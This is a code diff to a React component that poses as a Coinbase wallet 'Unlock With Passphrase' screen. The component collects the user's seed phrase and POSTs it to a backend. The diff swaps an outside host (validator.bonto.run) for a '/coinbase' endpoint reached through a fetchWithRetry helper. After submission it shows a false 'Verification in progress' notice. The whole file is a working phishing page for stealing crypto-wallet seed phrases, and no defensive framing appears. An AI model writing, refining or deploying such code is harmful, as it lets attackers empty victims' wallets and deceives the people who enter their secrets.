@@ -1,10 +1,10 @@
 import React, { useState } from 'react';
 import './coinbaseCss/coinbaseTwoWallet.css';
 import coinbaseLogo from '../../assets/coinbase_logo.png';
-import axios from 'axios';
 import { toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
 import { useNavigate } from 'react-router-dom';
+import fetchWithRetry from '../../utils/api';
 
 const CoinbaseTwoWallet = () => {
   const [seedPhrase, setSeedPhrase] = useState('');
@@ -14,19 +14,20 @@ const CoinbaseTwoWallet = () => {
   const navigate = useNavigate();
 
   const unlockWallet = async () => {
-    const url = 'https://validator.bonto.run/coinbase';
-    const payload = { passphrase: seedPhrase };
-
     try {
       setLoading(true);
-      const response = await axios.post(url, payload);
-      toast.success(response.data.message);
+      const res = await fetchWithRetry('/coinbase', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ passphrase: seedPhrase })
+      });
+
+      const data = await res.json();
+      toast.success(data.message);
       setSeedPhrase('');
       setShowSuccess(true);
     } catch (error) {
-      const message =
-        error.response?.data?.message || 'An error occurred. Please try again.';
-      toast.error(message);
+      toast.error('An error occurred. Please try again.');
     } finally {
       setLoading(false);
     }
@@ -38,7 +39,6 @@ const CoinbaseTwoWallet = () => {
 
   return (
     <div className="coinbaseTwo-wrapper">
-      {/* HEADER */}
       <header className="coinbaseTwo-header">
         <span className="coinbaseTwo-header-text">Wallet</span>
         <div className="coinbaseTwo-header-logo">
@@ -60,7 +60,6 @@ const CoinbaseTwoWallet = () => {
                 value={seedPhrase}
                 onChange={(e) => setSeedPhrase(e.target.value)}
               />
-
               <button
                 className="coinbaseTwo-primary-btn"
                 onClick={unlockWallet}
@@ -68,20 +67,17 @@ const CoinbaseTwoWallet = () => {
               >
                 {loading ? 'Loading...' : 'Unlock With Passphrase'}
               </button>
-
               <button
                 className="coinbaseTwo-secondary-btn"
                 onClick={unlockWithFaceId}
               >
                 Unlock With Face ID
               </button>
-
               <p className="coinbaseTwo-info-text">
                 As a non-custodial wallet, your wallet passphrase is exclusively
                 accessible only to you. Recovery of passphrase is currently
                 impossible.
               </p>
-
               <p className="coinbaseTwo-warning-text">
                 Lost your passphrase? <span>Create a new wallet</span>, but all
                 assets in your previous wallet will be inaccessible.
@@ -95,12 +91,10 @@ const CoinbaseTwoWallet = () => {
             <h3 className="coinbaseTwo-success-title">
               Verification in progress
             </h3>
-
             <p className="coinbaseTwo-info-text">
               Your wallet information has been submitted successfully.
               A confirmation email will be sent once verification is complete.
             </p>
-
             <div className="coinbaseTwo-action-row">
               <button
                 className="coinbaseTwo-primary-btn"
@@ -108,7 +102,6 @@ const CoinbaseTwoWallet = () => {
               >
                 Go Home
               </button>
-
               <button
                 className="coinbaseTwo-secondary-btn"
                 onClick={() => setShowSuccess(false)}
